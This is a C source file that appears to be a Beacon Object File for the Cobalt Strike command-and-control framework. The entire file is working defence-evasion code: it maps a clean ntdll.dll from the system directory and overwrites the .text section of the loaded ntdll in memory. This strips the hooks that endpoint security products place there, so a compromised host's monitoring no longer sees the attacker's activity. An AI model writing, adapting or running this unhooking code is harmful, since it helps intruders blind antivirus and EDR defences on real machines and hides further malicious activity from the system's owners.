#include <windows.h>
#include "beacon_compat.h"

void go(char *args, int args_len) {
    (void)args; (void)args_len;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ntdll.dll not found\n");
        return;
    }

    /* Build path to clean ntdll on disk */
    wchar_t ntdllPath[MAX_PATH];
    GetSystemDirectoryW(ntdllPath, MAX_PATH);
    wcscat(ntdllPath, L"\\ntdll.dll");

    HANDLE hFile = CreateFileW(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open ntdll.dll from disk: %lu\n",
                     GetLastError());
        return;
    }

    HANDLE hMapping = CreateFileMappingW(hFile, NULL,
                                         PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateFileMapping failed: %lu\n", GetLastError());
        CloseHandle(hFile);
        return;
    }

    void *pClean = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pClean) {
        BeaconPrintf(CALLBACK_ERROR, "[!] MapViewOfFile failed: %lu\n", GetLastError());
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    /* Find .text section */
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)
        ((BYTE *)hNtdll + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);
    WORD numSections = ntHeaders->FileHeader.NumberOfSections;

    BOOL patched = FALSE;

    for (WORD i = 0; i < numSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            DWORD textSize = section[i].Misc.VirtualSize;
            DWORD textRVA  = section[i].VirtualAddress;

            void *pHooked   = (BYTE *)hNtdll + textRVA;
            void *pOriginal = (BYTE *)pClean + textRVA;

            DWORD oldProtect;
            if (!VirtualProtect(pHooked, textSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                BeaconPrintf(CALLBACK_ERROR, "[!] VirtualProtect failed: %lu\n",
                             GetLastError());
                break;
            }

            memcpy(pHooked, pOriginal, textSize);
            VirtualProtect(pHooked, textSize, oldProtect, &oldProtect);
            patched = TRUE;

            BeaconPrintf(CALLBACK_OUTPUT,
                "[+] ntdll.dll .text restored (%lu bytes at RVA 0x%lX)\n",
                textSize, textRVA);
            break;
        }
    }

    UnmapViewOfFile(pClean);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    if (!patched)
        BeaconPrintf(CALLBACK_ERROR, "[!] .text section not found in ntdll\n");
}
